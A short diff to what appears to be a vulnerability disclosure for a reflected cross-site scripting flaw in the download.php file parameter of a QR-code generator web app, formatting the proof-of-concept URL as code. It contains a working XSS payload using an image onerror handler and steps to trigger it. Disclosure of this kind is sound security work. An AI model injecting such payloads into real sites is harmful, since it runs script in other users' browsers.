@@ -16,7 +16,7 @@ An attacker may leverage this issue to execute arbitrary script code in the brow
 
 ## Proof of Concept:
 + Copy the link address of "Download QR Code": "http://localhost/qr-codegen/download.php?file=author.png"
-+ And navigate to "http://localhost/qr-codegen/download.php?file=author.png"><iMg src=N onerror=alert(document.domain)>"
++ And navigate to `http://localhost/qr-codegen/download.php?file=author.png"><iMg src=N onerror=alert(document.domain)>`
 + Use this payload: `"><iMg src=N onerror=alert(document.domain)>`
 + The XSS will be triggered.
 + Alerts will pop-up.
